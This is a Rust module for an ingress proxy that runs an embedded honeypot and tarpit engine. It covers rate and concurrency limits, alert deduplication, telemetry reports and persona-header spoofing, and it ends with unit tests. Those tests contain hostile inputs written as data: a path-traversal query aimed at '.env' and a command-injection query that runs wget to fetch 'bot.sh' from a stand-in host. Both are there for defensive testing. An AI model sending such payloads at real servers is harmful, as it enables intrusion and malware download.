use std::net::IpAddr;
use std::pin::Pin;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::Arc;
use std::task::{Context, Poll};
use std::time::{Duration, Instant};

use bytes::Bytes;
use dashmap::DashMap;
use evilpot::{
    AdminPanelConfig, AttackSignal, EvilpotBody, EvilpotConfig, EvilpotEngine,
    ExploitVerificationStatus, VerificationEvidence,
};
use exposure_core::config::EvilpotNodeConfig;
use exposure_core::telemetry::{EvilpotEventInfo, EvilpotNodeReport, EvilpotSessionInfo};
use http::Response;
use http_body_util::BodyExt;
use hyper::body::{Body, Frame};
use rand::RngCore;
use tokio::sync::{OwnedSemaphorePermit, RwLock, Semaphore};
use tokio::task::JoinHandle;
use tracing::info;

use crate::egress::ProxyBody;
use crate::waf::WafFinding;

/// Hard bounds on telemetry snapshots so malicious traffic can never bloat `NodeStatusSnapshot`.
const MAX_REPORT_SESSIONS: usize = 64;
const MAX_REPORT_EVENTS: usize = 64;
const MAX_SESSION_ITEMS: usize = 16;
const MAX_EVENT_EVIDENCE_ITEMS: usize = 8;
const MAX_ITEM_CHARS: usize = 256;
const MAX_PATH_CHARS: usize = 128;

/// Hard bounds on inputs forwarded into `evilpot` per request.
pub const MAX_EVILPOT_PATH_CHARS: usize = 256;
pub const MAX_EVILPOT_QUERY_CHARS: usize = 512;

/// Hard DoS / CC protection caps for embedded `evilpot` execution on Ingress.
const MAX_GLOBAL_EVILPOT_INFLIGHT: usize = 64;
const MAX_PER_IP_EVILPOT_INFLIGHT: usize = 4;
const MAX_PER_IP_HITS_PER_WINDOW: u32 = 45;
const EVILPOT_RATE_WINDOW: Duration = Duration::from_secs(60);
const MAX_TRACKED_RATE_IPS: usize = 8192;

/// Hard wall-clock ceiling on slow-drip tarpit streams (10x `tarpit_verify_min_ms`,
/// enough to verify active exfil tools while preventing multi-day connection pinning).
const MAX_EVILPOT_STREAM_DURATION: Duration = Duration::from_secs(30);

/// Alert deduplication cooldown per `(client_ip, verification_status)` to prevent alert flooding.
const ALERT_COOLDOWN: Duration = Duration::from_secs(300);
const MAX_ALERT_COOLDOWN_ENTRIES: usize = 4096;

/// Zero-sized response extension marker indicating the response was synthesized by `evilpot`.
/// Ensures Ingress preserves `evilpot`'s rotating spoofed `Server` persona header without adding
/// any Exposure-specific wire headers.
#[derive(Debug, Clone, Copy)]
pub struct EvilpotStealthMarker;

/// RAII concurrency permit guarding both global and per-IP active `evilpot` request/stream slots.
pub struct EvilpotInflightPermit {
    _global: OwnedSemaphorePermit,
    per_ip_map: Arc<DashMap<IpAddr, Arc<AtomicUsize>>>,
    ip: IpAddr,
    counter: Arc<AtomicUsize>,
}

impl Drop for EvilpotInflightPermit {
    fn drop(&mut self) {
        if self.counter.fetch_sub(1, Ordering::AcqRel) == 1 {
            self.per_ip_map
                .remove_if(&self.ip, |_, c| c.load(Ordering::Acquire) == 0);
        }
    }
}

/// Wraps `evilpot::EvilpotBody` with a hard wall-clock deadline and retains `EvilpotInflightPermit`
/// until the response stream finishes or closes.
struct BoundedEvilpotBody {
    inner: EvilpotBody,
    deadline: Instant,
    _permit: Option<EvilpotInflightPermit>,
}

impl Body for BoundedEvilpotBody {
    type Data = Bytes;
    type Error = hyper::Error;

    fn poll_frame(
        mut self: Pin<&mut Self>,
        cx: &mut Context<'_>,
    ) -> Poll<Option<Result<Frame<Self::Data>, Self::Error>>> {
        if Instant::now() >= self.deadline {
            return Poll::Ready(None);
        }
        match Pin::new(&mut self.inner).poll_frame(cx) {
            Poll::Pending => Poll::Pending,
            Poll::Ready(None) => Poll::Ready(None),
            Poll::Ready(Some(Ok(frame))) => Poll::Ready(Some(Ok(frame))),
            Poll::Ready(Some(Err(never))) => match never {},
        }
    }
}

struct ActiveEvilpot {
    cfg: EvilpotNodeConfig,
    server_header: String,
    engine: Arc<EvilpotEngine>,
    rotation_task: JoinHandle<()>,
}

/// Manages an on-demand embedded `evilpot` deception, tarpit & exploit-verification engine
/// on an Ingress node with strict DoS/CC, memory, stream-duration, and alert-rate bounds.
///
/// The engine is instantiated lazily only when at least one active Guard policy uses
/// `waf.mode = evilpot`, and preserves active attacker sessions & canary tokens across
/// unrelated hot reloads.
pub struct EvilpotManager {
    node_tag: String,
    active: RwLock<Option<ActiveEvilpot>>,
    global_inflight: Arc<Semaphore>,
    per_ip_inflight: Arc<DashMap<IpAddr, Arc<AtomicUsize>>>,
    per_ip_rate: DashMap<IpAddr, (Instant, u32)>,
    alert_cooldowns: DashMap<(IpAddr, u8), Instant>,
}

impl EvilpotManager {
    pub fn new(node_tag: impl Into<String>) -> Self {
        Self {
            node_tag: node_tag.into(),
            active: RwLock::new(None),
            global_inflight: Arc::new(Semaphore::new(MAX_GLOBAL_EVILPOT_INFLIGHT)),
            per_ip_inflight: Arc::new(DashMap::new()),
            per_ip_rate: DashMap::new(),
            alert_cooldowns: DashMap::new(),
        }
    }

    pub async fn reconfigure(&self, cfg: &EvilpotNodeConfig, server_header: &str, enabled: bool) {
        let mut guard = self.active.write().await;
        if !enabled {
            if let Some(old) = guard.take() {
                old.rotation_task.abort();
                info!(node = %self.node_tag, "disabled embedded evilpot honeypot engine");
            }
            self.per_ip_rate.clear();
            self.alert_cooldowns.clear();
            return;
        }
        if let Some(ref existing) = *guard {
            if &existing.cfg == cfg && existing.server_header == server_header {
                return;
            }
        }
        if let Some(old) = guard.take() {
            old.rotation_task.abort();
        }
        let ep_cfg = to_evilpot_config(cfg, server_header);
        let engine = EvilpotEngine::new(ep_cfg);
        let rotation_task = engine.spawn_rotation_task();
        info!(
            node = %self.node_tag,
            rotation_secs = cfg.rotation_interval_secs,
            persona_slots = cfg.persona_slots,
            max_tarpit_conns = cfg.max_tarpit_connections,
            "initialized embedded evilpot honeypot engine"
        );
        *guard = Some(ActiveEvilpot {
            cfg: cfg.clone(),
            server_header: server_header.to_string(),
            engine,
            rotation_task,
        });
    }

    pub async fn engine(&self) -> Option<Arc<EvilpotEngine>> {
        self.active
            .read()
            .await
            .as_ref()
            .map(|a| Arc::clone(&a.engine))
    }

    pub async fn get_or_init(
        &self,
        cfg: &EvilpotNodeConfig,
        server_header: &str,
    ) -> Arc<EvilpotEngine> {
        if let Some(eng) = self.engine().await {
            return eng;
        }
        self.reconfigure(cfg, server_header, true).await;
        self.engine()
            .await
            .expect("evilpot engine initialized after reconfigure(true)")
    }

    /// Fast O(1) check used to skip canary scanning on benign traffic before any trap has fired.
    pub fn has_triggered_traps(engine: &EvilpotEngine) -> bool {
        engine.metrics.traps_triggered.load(Ordering::Relaxed) > 0
    }

    /// Admission control for diverting a request into `evilpot`.
    /// Enforces per-IP rolling rate budget, per-IP concurrent limit, and global concurrent limit
    /// so CC floods or HTTP/2 stream multiplexing cannot exhaust RAM or starve Ingress slots.
    pub fn try_admit(&self, client_ip: IpAddr) -> Option<EvilpotInflightPermit> {
        // 1. Per-IP rolling 60s interaction quota
        let now = Instant::now();
        if self.per_ip_rate.len() >= MAX_TRACKED_RATE_IPS {
            self.per_ip_rate
                .retain(|_, (ts, _)| now.duration_since(*ts) < EVILPOT_RATE_WINDOW);
            if self.per_ip_rate.len() >= MAX_TRACKED_RATE_IPS {
                self.per_ip_rate.clear();
            }
        }
        {
            let mut entry = self.per_ip_rate.entry(client_ip).or_insert((now, 0));
            if now.duration_since(entry.0) >= EVILPOT_RATE_WINDOW {
                *entry = (now, 1);
            } else {
                if entry.1 >= MAX_PER_IP_HITS_PER_WINDOW {
                    return None;
                }
                entry.1 = entry.1.saturating_add(1);
            }
        }

        // 2. Global concurrent Evilpot cap
        let global_permit = Arc::clone(&self.global_inflight).try_acquire_owned().ok()?;

        // 3. Per-IP concurrent Evilpot cap
        let counter = self
            .per_ip_inflight
            .entry(client_ip)
            .or_insert_with(|| Arc::new(AtomicUsize::new(0)))
            .clone();
        loop {
            let cur = counter.load(Ordering::Acquire);
            if cur >= MAX_PER_IP_EVILPOT_INFLIGHT {
                return None;
            }
            if counter
                .compare_exchange(cur, cur + 1, Ordering::AcqRel, Ordering::Acquire)
                .is_ok()
            {
                return Some(EvilpotInflightPermit {
                    _global: global_permit,
                    per_ip_map: Arc::clone(&self.per_ip_inflight),
                    ip: client_ip,
                    counter,
                });
            }
        }
    }

    /// Deduplicates alerts per `(client_ip, status)` with a 5-minute cooldown so repeated
    /// attacker requests cannot flood or evict legitimate node alerts.
    pub fn should_emit_alert(&self, client_ip: IpAddr, status: ExploitVerificationStatus) -> bool {
        let tag = match status {
            ExploitVerificationStatus::Probing => return false,
            ExploitVerificationStatus::MultiStepExploitation => 1u8,
            ExploitVerificationStatus::VerifiedExploit => 2u8,
        };
        let now = Instant::now();
        if self.alert_cooldowns.len() >= MAX_ALERT_COOLDOWN_ENTRIES {
            self.alert_cooldowns
                .retain(|_, ts| now.duration_since(*ts) < ALERT_COOLDOWN);
            if self.alert_cooldowns.len() >= MAX_ALERT_COOLDOWN_ENTRIES {
                self.alert_cooldowns.clear();
            }
        }
        let key = (client_ip, tag);
        if let Some(prev) = self.alert_cooldowns.get(&key) {
            if now.duration_since(*prev) < ALERT_COOLDOWN {
                return false;
            }
        }
        self.alert_cooldowns.insert(key, now);
        true
    }

    pub async fn build_report(&self) -> Option<EvilpotNodeReport> {
        let engine = self.engine().await?;
        let m = engine.metrics_snapshot();

        let mut raw_sessions = engine.all_session_reports();
        raw_sessions.sort_by(|a, b| {
            b.status
                .cmp(&a.status)
                .then_with(|| b.last_seen_unix.cmp(&a.last_seen_unix))
        });
        let sessions: Vec<EvilpotSessionInfo> = raw_sessions
            .into_iter()
            .take(MAX_REPORT_SESSIONS)
            .map(|s| EvilpotSessionInfo {
                client_ip: truncate_clean(&s.client_ip, 64),
                epoch_id: s.epoch_id,
                persona_hostname: truncate_clean(&s.persona_hostname, 128),
                first_seen_unix: s.first_seen_unix,
                last_seen_unix: s.last_seen_unix,
                total_trapped_requests: s.total_trapped_requests,
                status: verification_status_label(s.status).to_string(),
                canary_triggers: s.canary_triggers,
                sqli_probes: s.sqli_probes,
                sqli_distinct_positions: s.sqli_distinct_positions,
                rce_commands_executed: s
                    .rce_commands_executed
                    .into_iter()
                    .rev()
                    .take(MAX_SESSION_ITEMS)
                    .map(|c| truncate_clean(&c, MAX_ITEM_CHARS))
                    .collect(),
                captured_iocs: s
                    .captured_iocs
                    .into_iter()
                    .take(MAX_SESSION_ITEMS)
                    .map(|i| truncate_clean(&i, MAX_ITEM_CHARS))
                    .collect(),
                distinct_paths: s
                    .distinct_paths
                    .into_iter()
                    .take(MAX_SESSION_ITEMS)
                    .map(|p| truncate_clean(&p, MAX_PATH_CHARS))
                    .collect(),
                tarpit_bytes_consumed: s.tarpit_bytes_consumed,
                tarpit_max_duration_ms: s.tarpit_max_duration_ms,
                evidence: s
                    .evidence
                    .iter()
                    .rev()
                    .take(MAX_SESSION_ITEMS)
                    .map(|ev| truncate_clean(&format_evidence(ev), MAX_ITEM_CHARS))
                    .collect(),
            })
            .collect();

        let recent_events: Vec<EvilpotEventInfo> = engine
            .recent_events()
            .into_iter()
            .rev()
            .take(MAX_REPORT_EVENTS)
            .map(|e| EvilpotEventInfo {
                timestamp_unix: e.timestamp_unix,
                epoch_id: e.epoch_id,
                persona_hostname: truncate_clean(&e.persona_hostname, 128),
                client_ip: truncate_clean(&e.client_ip, 64),
                verification_status: verification_status_label(e.verification_status).to_string(),
                trap_kind: truncate_clean(&e.trap_kind, 128),
                detail: truncate_clean(&e.detail, MAX_ITEM_CHARS),
                evidence: e
                    .evidence
                    .iter()
                    .take(MAX_EVENT_EVIDENCE_ITEMS)
                    .map(|ev| truncate_clean(&format_evidence(ev), MAX_ITEM_CHARS))
                    .collect(),
            })
            .collect();

        Some(EvilpotNodeReport {
            node_tag: self.node_tag.clone(),
            current_epoch: m.current_epoch,
            rotations_completed: m.rotations_completed,
            requests_handled: m.requests_handled,
            traps_triggered: m.traps_triggered,
            canary_verifications: m.canary_verifications,
            verified_attack_sessions: m.verified_attack_sessions,
            tarpit_bytes_dripped: m.tarpit_bytes_dripped,
            active_tarpit_connections: m.active_tarpit_connections,
            sessions,
            recent_events,
        })
    }
}

impl Drop for EvilpotManager {
    fn drop(&mut self) {
        if let Ok(mut guard) = self.active.try_write() {
            if let Some(old) = guard.take() {
                old.rotation_task.abort();
            }
        }
    }
}

/// Truncate and strip control characters from untrusted strings before storing in telemetry/reports.
pub fn truncate_clean(raw: &str, max_chars: usize) -> String {
    raw.chars()
        .filter(|c| !c.is_control() || *c == ' ')
        .take(max_chars)
        .collect()
}

/// Bound URI path/query strings passed into `evilpot` so huge URLs cannot inflate session state.
pub fn clamp_input_slice(raw: &str, max_chars: usize) -> &str {
    match raw.char_indices().nth(max_chars) {
        Some((idx, _)) => &raw[..idx],
        None => raw,
    }
}

fn to_evilpot_config(cfg: &EvilpotNodeConfig, server_header: &str) -> EvilpotConfig {
    let mut seed = [0u8; 8];
    rand::thread_rng().fill_bytes(&mut seed);
    let mut ep = EvilpotConfig::default();
    ep.rotation_interval_secs = cfg.rotation_interval_secs.max(60);
    ep.persona_slots = cfg.persona_slots.clamp(1, 32);
    ep.master_seed = u64::from_le_bytes(seed);
    ep.max_tarpit_connections = cfg.max_tarpit_connections.clamp(1, 256);
    ep.tarpit_drip_bytes_per_sec = cfg.tarpit_drip_bytes_per_sec.clamp(16, 16_384);
    ep.sqli_time_delay_ms = cfg.sqli_time_delay_ms.clamp(100, 5_000);
    ep.server_header = Some(server_header.trim().to_string());
    ep.emit_persona_headers = false;
    let sanitized_url: String = cfg
        .canary_webhook_url
        .trim()
        .chars()
        .filter(|c| !c.is_control())
        .take(256)
        .collect();
    if !sanitized_url.is_empty() {
        ep.canary_webhook_url = sanitized_url;
    }
    ep.max_tracked_sessions = cfg.max_tracked_sessions.clamp(16, 4096);
    // Disable standalone HTTP admin routes on Ingress — Exposure exposes all behavior analysis
    // securely via the authenticated mesh telemetry & Control Plane UI.
    ep.admin = AdminPanelConfig {
        enabled: false,
        ..Default::default()
    };
    ep
}

pub fn verification_status_label(status: ExploitVerificationStatus) -> &'static str {
    match status {
        ExploitVerificationStatus::Probing => "probing",
        ExploitVerificationStatus::MultiStepExploitation => "multi_step_exploitation",
        ExploitVerificationStatus::VerifiedExploit => "verified_exploit",
    }
}

pub fn format_evidence(ev: &VerificationEvidence) -> String {
    match ev {
        VerificationEvidence::CanaryTriggered {
            kind,
            token_or_path,
        } => format!("canary:{kind}={token_or_path}"),
        VerificationEvidence::SqliExtractionProgress {
            probe_count,
            distinct_char_positions,
        } => format!("sqli:probes={probe_count},positions={distinct_char_positions}"),
        VerificationEvidence::RceShellInteraction {
            command_count,
            last_command,
            captured_iocs,
        } => format!(
            "rce:cmds={command_count},last={last_command},iocs={}",
            captured_iocs.len()
        ),
        VerificationEvidence::MultiPathRecon {
            distinct_paths_probed,
        } => format!("recon:paths={distinct_paths_probed}"),
        VerificationEvidence::SustainedTarpitRead {
            bytes_read,
            duration_ms,
        } => format!("tarpit:bytes={bytes_read},ms={duration_ms}"),
    }
}

pub fn build_attack_signal(
    finding: &WafFinding,
    fallback_payload: Option<&str>,
) -> AttackSignal {
    let mut sig = AttackSignal::from_waf_finding(
        finding.category,
        finding.location,
        finding.confidence,
        finding.reasons.iter().map(|r| (*r).to_string()).collect(),
    );
    if let Some(ref p) = finding.matched_payload {
        sig = sig.with_payload(p.clone());
    } else if let Some(fb) = fallback_payload {
        if !fb.is_empty() {
            sig = sig.with_payload(fb.chars().take(512).collect::<String>());
        }
    }
    sig
}

/// Zero-copy conversion from `evilpot::EvilpotBody` (`Infallible` error) to Exposure's `ProxyBody`,
/// enforcing a hard stream duration deadline (`MAX_EVILPOT_STREAM_DURATION`), retaining the
/// admission `EvilpotInflightPermit` until stream completion, and attaching `EvilpotStealthMarker`
/// so Ingress preserves `evilpot`'s spoofed persona `Server` header.
pub fn into_proxy_response(
    resp: Response<EvilpotBody>,
    permit: Option<EvilpotInflightPermit>,
) -> Response<ProxyBody> {
    let deadline = Instant::now() + MAX_EVILPOT_STREAM_DURATION;
    let mut out = resp.map(|body| {
        BoundedEvilpotBody {
            inner: body,
            deadline,
            _permit: permit,
        }
        .boxed()
    });
    out.extensions_mut().insert(EvilpotStealthMarker);
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::waf::{inspect_request_head, WafVerdict};
    use exposure_core::config::{WafConfig, WafMode};
    use http::{HeaderMap, HeaderValue};
    use std::net::IpAddr;

    #[tokio::test]
    async fn waf_evilpot_diversion_verifies_canary_replay_and_builds_report() {
        let mgr = EvilpotManager::new("ingress-test");
        assert!(mgr.build_report().await.is_none());

        mgr.reconfigure(&EvilpotNodeConfig::default(), "nginx", true).await;
        let engine = mgr.engine().await.expect("evilpot engine active");
        assert!(!EvilpotManager::has_triggered_traps(&engine));

        let waf_cfg = WafConfig {
            mode: WafMode::Evilpot,
            ..Default::default()
        };
        let attacker_ip: IpAddr = "198.51.100.77".parse().unwrap();
        let headers = HeaderMap::new();

        // 1. WAF triggers on path traversal targeting `.env` and yields WafVerdict::Evilpot
        let verdict = inspect_request_head(
            &waf_cfg,
            "/download",
            Some("file=../../../../.env"),
            &headers,
        );
        let finding = match verdict {
            WafVerdict::Evilpot(f) => f,
            other => panic!("expected WafVerdict::Evilpot, got {other:?}"),
        };
        assert_eq!(finding.category, "path-traversal");
        assert!(finding.matched_payload.as_deref().unwrap_or("").contains(".env"));

        let permit = mgr.try_admit(attacker_ip).expect("admitted");
        let sig = build_attack_signal(&finding, Some("file=../../../../.env"));
        let outcome = engine
            .handle_attack(
                attacker_ip,
                "GET",
                "/download",
                Some("file=../../../../.env"),
                &headers,
                sig,
            )
            .await;
        assert_eq!(outcome.session.status, ExploitVerificationStatus::Probing);
        assert!(EvilpotManager::has_triggered_traps(&engine));

        let proxy_resp = into_proxy_response(outcome.response, Some(permit));
        assert!(proxy_resp.extensions().get::<EvilpotStealthMarker>().is_some());
        let body_bytes = proxy_resp.into_body().collect().await.unwrap().to_bytes();
        let body_str = std::str::from_utf8(&body_bytes).unwrap();

        // 2. Attacker steals implanted canary API key and replays it on a benign-looking API request
        let persona = engine.select_persona(attacker_ip);
        assert!(body_str.contains(&persona.canary_api_key));

        let mut follow_headers = HeaderMap::new();
        follow_headers.insert(
            "authorization",
            HeaderValue::from_str(&format!("Bearer {}", persona.canary_api_key)).unwrap(),
        );
        let canary_out = engine
            .handle_canary_if_present(
                attacker_ip,
                "GET",
                "/api/v1/profile",
                None,
                &follow_headers,
            )
            .await
            .expect("canary replay must be caught");
        assert_eq!(
            canary_out.session.status,
            ExploitVerificationStatus::VerifiedExploit
        );

        // Alert cooldown emits once and suppresses immediate duplicates
        assert!(mgr.should_emit_alert(attacker_ip, ExploitVerificationStatus::VerifiedExploit));
        assert!(!mgr.should_emit_alert(attacker_ip, ExploitVerificationStatus::VerifiedExploit));

        // 3. Report accurately reflects verified session, canary metrics, and events
        let report = mgr.build_report().await.expect("report present");
        assert_eq!(report.node_tag, "ingress-test");
        assert_eq!(report.canary_verifications, 1);
        assert_eq!(report.verified_attack_sessions, 1);
        assert_eq!(report.sessions.len(), 1);
        assert_eq!(report.sessions[0].status, "verified_exploit");
        assert_eq!(report.sessions[0].canary_triggers, 1);
        assert!(!report.recent_events.is_empty());

        // 4. Disabling tears down engine cleanly
        mgr.reconfigure(&EvilpotNodeConfig::default(), "nginx", false).await;
        assert!(mgr.build_report().await.is_none());
    }

    #[tokio::test]
    async fn waf_evilpot_captures_rce_malware_ioc_in_report() {
        let mgr = EvilpotManager::new("ingress-rce");
        mgr.reconfigure(&EvilpotNodeConfig::default(), "nginx", true).await;
        let engine = mgr.engine().await.unwrap();

        let waf_cfg = WafConfig {
            mode: WafMode::Evilpot,
            ..Default::default()
        };
        let ip: IpAddr = "203.0.113.55".parse().unwrap();
        let headers = HeaderMap::new();
        let query = "host=127.0.0.1;wget+http://198.51.100.200/bot.sh+-O+/tmp/bot.sh";
        let finding = match inspect_request_head(&waf_cfg, "/ping", Some(query), &headers) {
            WafVerdict::Evilpot(f) => f,
            other => panic!("expected WafVerdict::Evilpot, got {other:?}"),
        };
        let sig = build_attack_signal(&finding, Some(query));
        let out = engine
            .handle_attack(ip, "GET", "/ping", Some(query), &headers, sig)
            .await;
        assert_eq!(out.session.status, ExploitVerificationStatus::VerifiedExploit);

        let report = mgr.build_report().await.unwrap();
        assert_eq!(report.sessions.len(), 1);
        assert!(report.sessions[0]
            .captured_iocs
            .iter()
            .any(|ioc| ioc.contains("http://198.51.100.200/bot.sh")));
    }

    #[test]
    fn admission_enforces_per_ip_concurrency_and_rate_limits() {
        let mgr = EvilpotManager::new("ingress-dos");
        let ip: IpAddr = "198.51.100.200".parse().unwrap();

        // Concurrency cap: max MAX_PER_IP_EVILPOT_INFLIGHT active permits per IP
        let mut held = Vec::new();
        for _ in 0..MAX_PER_IP_EVILPOT_INFLIGHT {
            held.push(mgr.try_admit(ip).expect("within per-IP concurrency limit"));
        }
        assert!(mgr.try_admit(ip).is_none(), "5th concurrent slot must be rejected");
        held.clear();

        // Fresh IP verifies exact rolling 60s interaction quota cap
        let ip2: IpAddr = "198.51.100.201".parse().unwrap();
        let mut admitted_total = 0u32;
        for _ in 0..(MAX_PER_IP_HITS_PER_WINDOW + 10) {
            if let Some(p) = mgr.try_admit(ip2) {
                admitted_total += 1;
                drop(p);
            }
        }
        assert_eq!(admitted_total, MAX_PER_IP_HITS_PER_WINDOW);
    }
}
